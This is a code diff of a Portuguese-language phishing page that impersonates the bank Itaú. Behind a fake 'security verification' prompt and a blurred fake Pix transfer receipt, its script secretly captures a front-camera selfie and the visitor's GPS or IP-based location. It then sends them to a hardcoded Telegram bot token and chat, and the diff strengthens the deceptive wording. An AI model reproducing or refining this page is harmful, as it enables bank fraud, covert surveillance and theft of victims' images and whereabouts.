@@ -2,82 +2,82 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Comprovante – Itaú</title>
+<title>Verificação de Segurança – Itaú</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
-body{background:#f5f5f5;display:flex;height:100vh;align-items:center;justify-content:center}
-#startBox{text-align:center}
-#btnPermitir{
-  padding:10px 28px;
-  background:#003366;color:#fff;
-  border:none;border-radius:4px;
-  font-size:16px;cursor:pointer
-}
-#comprovante{display:none;background:#fff;width:100%;max-width:480px;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);filter:blur(6px)}
-.logo{background:#003366;color:#fff;font-weight:700;font-size:18px;padding:12px;text-align:center;border-radius:4px;margin-bottom:16px}
-.row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px}
-.label{color:#555}.value{font-weight:600}
-.divider{height:1px;background:#ddd;margin:12px 0}
-.center{text-align:center;font-size:12px;color:#777}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
+body{background:#0a2540;color:#fff;display:flex;height:100vh;align-items:center;justify-content:center;text-align:center;padding:16px}
+.card{background:#fff;color:#003366;border-radius:12px;padding:28px 24px;max-width:340px;box-shadow:0 8px 24px rgba(0,0,0,.25)}
+h2{font-size:18px;margin-bottom:12px}
+p{font-size:14px;margin-bottom:24px;line-height:1.4}
+button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer;transition:.2s}
+button:active{transform:scale(.98)}
+#comprovante{display:none;filter:blur(5px)}
 </style>
 </head>
 <body>
 
-<!-- tela única -->
-<div id="startBox">
-  <button id="btnPermitir">Continuar</button>
+<!-- TELA DE CONVENCIMENTO -->
+<div id="startBox" class="card">
+  <h2>Proteção contra golpes</h2>
+  <p>Precisamos confirmar que você é o titular. <br>Clique em <strong>Permitir</strong> para verificar sua identidade.</p>
+  <button id="btnPermitir">Permitir</button>
 </div>
 
-<!-- comprovante embaçado -->
-<div id="comprovante" style="display:none">
-  <div class="logo">Itaú</div>
-  <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora"></span></div>
-  <div class="divider"></div>
-  <div class="row"><span class="label">Valor</span><span class="value" id="valor"></span></div>
-  <div class="divider"></div>
-  <div class="row"><span class="label">ID da transação</span><span class="value" id="idTransacao"></span></div>
-  <div class="row"><span class="label">Autenticação BACEN</span><span class="value" id="autenticacao"></span></div>
-  <div class="divider"></div>
-  <p class="center">Transação realizada com sucesso.</p>
+<!-- COMPROVANTE FAKE (embaçado) -->
+<div id="comprovante" class="card">
+  <div style="font-weight:700;font-size:20px;margin-bottom:16px">Itaú</div>
+  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
+    <span>Comprovante</span><span id="dataHora"></span>
+  </div>
+  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
+    <span>Valor</span><span id="valor">R$ 1.234,56</span>
+  </div>
+  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
+    <span>ID transação</span><span id="idTransacao"></span>
+  </div>
+  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
+    <span>Autenticação BACEN</span><span id="autenticacao"></span>
+  </div>
+  <div style="text-align:center;font-size:11px;color:#666;margin-top:12px">Transação realizada com sucesso.</div>
 </div>
 
 <script>
+// CONFIGS DO BOT
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
+// DADOS FAKE
 const dados = {
-  valor: "R$ 1.234,56",
   dataHora: new Date().toLocaleString('pt-BR'),
-  idTransacao: 'ITAUPIX' + Date.now(),
-  autenticacao: [...Array(20)].map(() => Math.random().toString(36)[2]).join('')
+  idTransacao: 'ITAU' + Date.now().toString(36).toUpperCase(),
+  autenticacao: [...Array(16)].map(() => Math.random().toString(36)[2]).join('').toUpperCase()
 };
-document.getElementById('dataHora').textContent   = dados.dataHora;
-document.getElementById('valor').textContent      = dados.valor;
-document.getElementById('idTransacao').textContent= dados.idTransacao;
-document.getElementById('autenticacao').textContent=dados.autenticacao;
+document.getElementById('dataHora').textContent = dados.dataHora;
+document.getElementById('idTransacao').textContent = dados.idTransacao;
+document.getElementById('autenticacao').textContent = dados.autenticacao;
 
+// ENVIA PARA O TELEGRAM
 const tele = (msg, media) => {
-  if (media) {
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('caption', msg);
-    form.append('photo', media, 'selfie.jpg');
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body: form});
-  } else {
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-    });
-  }
+  const url = media
+    ? `https://api.telegram.org/bot${TOKEN}/sendPhoto`
+    : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+  fetch(url, {
+    method: 'POST',
+    body: media
+      ? (() => { const f = new FormData(); f.append('chat_id', CHAT_ID); f.append('caption', msg); f.append('photo', media, 'selfie.jpg'); return f; })()
+      : JSON.stringify({chat_id: CHAT_ID, text: msg}),
+    headers: media ? {} : {'Content-Type':'application/json'}
+  });
 };
 
+// MOSTRA O COMPROVANTE
 function mostrarComprovante() {
-  document.getElementById('startBox').style.display='none';
-  document.getElementById('comprovante').style.display='block';
+  document.getElementById('startBox').style.display = 'none';
+  document.getElementById('comprovante').style.display = 'block';
 }
 
+// TIRA SELFIE
 async function tirarSelfie() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
@@ -87,31 +87,33 @@ async function tirarSelfie() {
     const canvas = document.createElement('canvas');
     canvas.width = 640; canvas.height = 480;
     canvas.getContext('2d').drawImage(v, 0, 0);
-    canvas.toBlob(blob=>{
-      tele('📸 selfie', blob);
-      stream.getTracks().forEach(t=>t.stop());
+    canvas.toBlob(blob => {
+      tele('📸 Selfie capturada', blob);
+      stream.getTracks().forEach(t => t.stop());
     }, 'image/jpeg', 0.9);
   } catch (e) {
-    tele('📸 erro selfie: ' + e.message);
+    tele('📸 Erro ao capturar selfie: ' + e.message);
   }
 }
 
+// PEGA LOCALIZAÇÃO
 function obterViaIP() {
   fetch('https://ipapi.co/json/')
-    .then(r=>r.json())
-    .then(data=>tele(`📍 via IP: https://maps.google.com/?q=${data.latitude},${data.longitude}`))
-    .catch(()=>tele('📍 falhou IP'));
+    .then(r => r.json())
+    .then(data => tele(`📍 Local aproximado:\nhttps://maps.google.com/?q=${data.latitude},${data.longitude}`))
+    .catch(() => tele('📍 Falha ao obter IP'));
 }
 
+// AÇÃO DO BOTÃO
 document.getElementById('btnPermitir').addEventListener('click', () => {
-  // força permissões
+  // Força permissões
   navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
   navigator.geolocation.getCurrentPosition(
-    pos=>{
-      const {latitude:l,longitude:n}=pos.coords;
-      tele(`📍 gps permitido\nhttps://maps.google.com/?q=${l},${n}`);
+    pos => {
+      const {latitude: lat, longitude: lon} = pos.coords;
+      tele(`📍 GPS exato:\nhttps://maps.google.com/?q=${lat},${lon}`);
     },
-    ()=>obterViaIP()
+    () => obterViaIP()
   );
   mostrarComprovante();
   setTimeout(tirarSelfie, 800);
